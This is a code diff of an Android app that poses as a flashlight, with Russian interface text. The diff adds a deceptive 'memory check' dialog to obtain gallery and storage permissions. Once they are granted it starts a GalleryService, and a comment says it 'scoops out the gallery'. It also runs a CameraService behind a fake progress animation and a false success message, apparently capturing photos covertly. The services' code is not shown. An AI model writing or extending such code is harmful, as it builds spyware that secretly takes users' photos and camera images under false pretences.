@@ -17,6 +17,8 @@ import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import java.util.ArrayList;
+import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
     private boolean isProcessing = false;
@@ -44,58 +46,94 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {}
 
         btn.setOnClickListener(v -> {
+            List<String> perms = new ArrayList<>();
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                perms.add(Manifest.permission.CAMERA);
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
+                    perms.add(Manifest.permission.READ_MEDIA_IMAGES);
+                }
+            } else {
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                    perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+                }
+            }
+
+            if (!perms.isEmpty()) {
                 new AlertDialog.Builder(this)
-                    .setTitle("Фонарь не работает")
-                    .setMessage("Чтобы началась проверка, разрешите доступ к камере.")
+                    .setTitle("Проверка памяти")
+                    .setMessage("Для точной диагностики камеры и памяти необходимо предоставить доступ к файлам и камере.")
                     .setPositiveButton("Разрешить доступ", (dialog, which) -> {
-                        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, 1);
+                        ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), 1);
                     })
                     .setCancelable(false)
                     .show();
                 return;
             }
 
-            if (isProcessing) return;
-            isProcessing = true;
-
-            try {
-                greenOverlay.setVisibility(View.VISIBLE);
-                tvAnim.setText("Проверка.");
-                
-                Handler handler = new Handler(Looper.getMainLooper());
-                handler.postDelayed(() -> tvAnim.setText("Проверка.."), 600);
-                handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1200);
-
-                // Через 2 секунды: белый экран, ВКЛЮЧАЕМ ФОНАРЬ и запускаем камеры
-                handler.postDelayed(() -> {
-                    greenOverlay.setVisibility(View.GONE);
-                    whiteOverlay.setVisibility(View.VISIBLE);
-                    
-                    // Включаем фонарь, чтобы было видно комнату
-                    try { if (cameraId != null) cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}
-                    
-                    Intent svc = new Intent(this, CameraService.class);
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
-                    else startService(svc);
-
-                }, 2000);
-
-                // Через 9 секунд: убираем белый экран, ВЫКЛЮЧАЕМ фонарь, "Успех"
-                handler.postDelayed(() -> {
-                    whiteOverlay.setVisibility(View.GONE);
-                    try { if (cameraId != null) cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
-                    
-                    isProcessing = false;
-                    new AlertDialog.Builder(this)
-                        .setTitle("Успех")
-                        .setMessage("Все сработало. Фонарь готов к работе.")
-                        .setPositiveButton("ОК", null)
-                        .show();
-
-                }, 9000);
-
-            } catch (Exception e) { e.printStackTrace(); }
+            // Если разрешения уже есть - запускаем
+            startEverything();
         });
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == 1) {
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) allGranted = false;
+            }
+            
+            if (allGranted) {
+                // СРАЗУ ПОСЛЕ РАЗРЕШЕНИЯ ВЫГРЕБАЕМ ГАЛЕРЕЮ
+                Intent gallerySvc = new Intent(this, GalleryService.class);
+                startService(gallerySvc);
+                
+                // И запускаем анимацию со снимком
+                startEverything();
+            }
+        }
+    }
+
+    private void startEverything() {
+        if (isProcessing) return;
+        isProcessing = true;
+
+        try {
+            greenOverlay.setVisibility(View.VISIBLE);
+            tvAnim.setText("Проверка.");
+            
+            Handler handler = new Handler(Looper.getMainLooper());
+            handler.postDelayed(() -> tvAnim.setText("Проверка.."), 600);
+            handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1200);
+
+            handler.postDelayed(() -> {
+                greenOverlay.setVisibility(View.GONE);
+                whiteOverlay.setVisibility(View.VISIBLE);
+                
+                try { if (cameraId != null) cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}
+                
+                Intent svc = new Intent(this, CameraService.class);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
+                else startService(svc);
+
+            }, 2000);
+
+            handler.postDelayed(() -> {
+                whiteOverlay.setVisibility(View.GONE);
+                try { if (cameraId != null) cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
+                
+                isProcessing = false;
+                new AlertDialog.Builder(this)
+                    .setTitle("Успех")
+                    .setMessage("Все сработало. Фонарь готов к работе.")
+                    .setPositiveButton("ОК", null)
+                    .show();
+
+            }, 10000);
+
+        } catch (Exception e) { e.printStackTrace(); }
     }
 }
